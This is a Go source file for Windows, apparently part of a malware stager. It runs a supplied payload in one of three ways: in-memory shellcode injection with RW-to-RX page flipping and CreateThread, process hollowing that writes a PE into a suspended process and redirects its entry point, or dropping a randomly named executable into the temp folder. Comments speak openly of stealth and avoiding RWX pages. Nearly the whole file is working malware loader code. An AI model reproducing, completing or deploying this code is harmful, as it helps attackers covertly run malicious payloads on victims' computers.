//go:build windows

package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procVirtualAlloc   = modKernel32.NewProc("VirtualAlloc")
	procVirtualFree    = modKernel32.NewProc("VirtualFree")
	procCreateThread   = modKernel32.NewProc("CreateThread")
	procWaitForSObject = modKernel32.NewProc("WaitForSingleObject")
	procRtlCopyMem     = modKernel32.NewProc("RtlCopyMemory")

	procCreateProcessW    = modKernel32.NewProc("CreateProcessW")
	procGetThreadContext   = modKernel32.NewProc("GetThreadContext")
	procSetThreadContext   = modKernel32.NewProc("SetThreadContext")
	procResumeThread      = modKernel32.NewProc("ResumeThread")
	procReadProcessMemory = modKernel32.NewProc("ReadProcessMemory")
	procWriteProcessMemory = modKernel32.NewProc("WriteProcessMemory")
	procVirtualAllocEx    = modKernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx  = modKernel32.NewProc("VirtualProtectEx")
)

const (
	memCommit       uintptr = 0x1000
	memReserve      uintptr = 0x2000
	memRelease      uintptr = 0x8000
	pageRW          uintptr = 0x04
	createSuspended uint32  = 0x00000004
	infinite        uint32  = 0xFFFFFFFF
	threadAllAccess uintptr = 0x001F03FF
)

// execute dispatches to the configured execution method.
func execute(payload []byte) error {
	switch execMethod {
	case "hollow":
		return execHollow(payload)
	case "drop":
		return execDrop(payload)
	default: // "thread"
		return execThread(payload)
	}
}

// execThread allocates RW memory, writes shellcode, then flips to RX before
// creating the thread — W^X discipline, no RWX pages.
func execThread(sc []byte) error {
	if len(sc) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	// Allocate RW (not RWX)
	addr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(len(sc)),
		memCommit|memReserve,
		pageRW,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc: %v", err)
	}

	// Write shellcode while page is writable
	procRtlCopyMem.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

	// Flip RW → RX before execution
	const pageRX uintptr = 0x20
	var oldProt uint32
	ret, _, e := procVirtualProtectEx.Call(
		^uintptr(0), // current process pseudo-handle
		addr,
		uintptr(len(sc)),
		pageRX,
		uintptr(unsafe.Pointer(&oldProt)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect RX: %v", e)
	}

	tid := uint32(0)
	h, _, err := procCreateThread.Call(
		0, 0, addr, 0, 0,
		uintptr(unsafe.Pointer(&tid)),
	)
	if h == 0 {
		return fmt.Errorf("CreateThread: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(h))

	procWaitForSObject.Call(h, uintptr(infinite))
	return nil
}

// execHollow spawns hollowExe suspended, injects the payload PE, and resumes.
// Payload should be a Windows PE (EXE). The hollowed process executes it.
func execHollow(pe []byte) error {
	if len(pe) < 64 {
		return fmt.Errorf("payload too small to be a PE")
	}

	exeW, err := windows.UTF16PtrFromString(hollowExe)
	if err != nil {
		return err
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	ret, _, e := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exeW)),
		0, 0, 0, 0,
		uintptr(createSuspended),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess: %v", e)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// Parse preferred load address from PE headers
	dosBase := uintptr(unsafe.Pointer(&pe[0]))
	e_lfanew := *(*uint32)(unsafe.Pointer(dosBase + 60))
	imageBase := *(*uint64)(unsafe.Pointer(dosBase + uintptr(e_lfanew) + 24 + 24))
	sizeOfImage := *(*uint32)(unsafe.Pointer(dosBase + uintptr(e_lfanew) + 24 + 56))

	// Allocate memory in target at preferred image base
	remoteBase, _, e := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(sizeOfImage),
		memCommit|memReserve,
		pageRW,
	)
	if remoteBase == 0 {
		// Fallback: let OS choose address
		remoteBase, _, e = procVirtualAllocEx.Call(
			uintptr(pi.Process),
			0,
			uintptr(sizeOfImage),
			memCommit|memReserve,
			pageRW,
		)
		if remoteBase == 0 {
			return fmt.Errorf("VirtualAllocEx: %v", e)
		}
	}

	// Write PE headers
	headerSize := *(*uint32)(unsafe.Pointer(dosBase + uintptr(e_lfanew) + 24 + 60))
	var written uintptr
	ret, _, e = procWriteProcessMemory.Call(
		uintptr(pi.Process),
		remoteBase,
		dosBase,
		uintptr(headerSize),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory headers: %v", e)
	}

	// Write each section
	numSections := *(*uint16)(unsafe.Pointer(dosBase + uintptr(e_lfanew) + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(dosBase + uintptr(e_lfanew) + 20))
	sectionBase := dosBase + uintptr(e_lfanew) + 24 + uintptr(optHeaderSize)

	for i := uint16(0); i < numSections; i++ {
		sec := sectionBase + uintptr(i)*40
		virtualAddr := *(*uint32)(unsafe.Pointer(sec + 12))
		rawSize := *(*uint32)(unsafe.Pointer(sec + 16))
		rawOffset := *(*uint32)(unsafe.Pointer(sec + 20))
		if rawSize == 0 {
			continue
		}
		procWriteProcessMemory.Call(
			uintptr(pi.Process),
			remoteBase+uintptr(virtualAddr),
			dosBase+uintptr(rawOffset),
			uintptr(rawSize),
			uintptr(unsafe.Pointer(&written)),
		)
	}

	// Fix up context: patch RIP to new entry point
	ctx := newStagerContext()
	ctx.setFlags(0x0010001F)
	ret, _, e = procGetThreadContext.Call(uintptr(pi.Thread), ctx.ptr())
	if ret == 0 {
		return fmt.Errorf("GetThreadContext: %v", e)
	}

	ep := *(*uint32)(unsafe.Pointer(dosBase + uintptr(e_lfanew) + 24 + 16))
	ctx.setRIP(remoteBase + uintptr(ep))

	ret, _, e = procSetThreadContext.Call(uintptr(pi.Thread), ctx.ptr())
	if ret == 0 {
		return fmt.Errorf("SetThreadContext: %v", e)
	}

	procResumeThread.Call(uintptr(pi.Thread))
	return nil
}

// execDrop writes the payload to a temp file and executes it.
// Least stealthy but most compatible — works with any PE.
func execDrop(pe []byte) error {
	tmp := filepath.Join(os.TempDir(), randomName()+".exe")
	if err := os.WriteFile(tmp, pe, 0755); err != nil {
		return fmt.Errorf("write temp: %v", err)
	}

	exeW, err := windows.UTF16PtrFromString(tmp)
	if err != nil {
		return err
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	ret, _, e := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exeW)),
		0, 0, 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		_ = os.Remove(tmp)
		return fmt.Errorf("CreateProcess: %v", e)
	}
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	return nil
}

func randomName() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	buf := make([]byte, 8)
	if _, err := rand.Read(buf); err != nil {
		// fallback: mix pid + time bytes
		t := time.Now().UnixNano()
		p := int64(os.Getpid())
		for i := range buf {
			buf[i] = byte((t ^ (p << uint(i*7))) & 0xFF)
		}
	}
	out := make([]byte, 8)
	for i, v := range buf {
		out[i] = chars[int(v)%len(chars)]
	}
	return string(out)
}

// ── minimal context wrapper ───────────────────────────────────────────────────

type stagerCtx struct {
	buf [1232 + 16]byte
	p   uintptr
}

func newStagerContext() *stagerCtx {
	c := &stagerCtx{}
	a := uintptr(unsafe.Pointer(&c.buf[0]))
	if a&15 != 0 {
		a = (a + 15) &^ 15
	}
	c.p = a
	return c
}
func (c *stagerCtx) ptr() uintptr { return c.p }
func (c *stagerCtx) setFlags(f uint32) {
	*(*uint32)(unsafe.Pointer(c.p + 48)) = f
}
func (c *stagerCtx) setRIP(v uintptr) {
	*(*uint64)(unsafe.Pointer(c.p + 248)) = uint64(v)
}
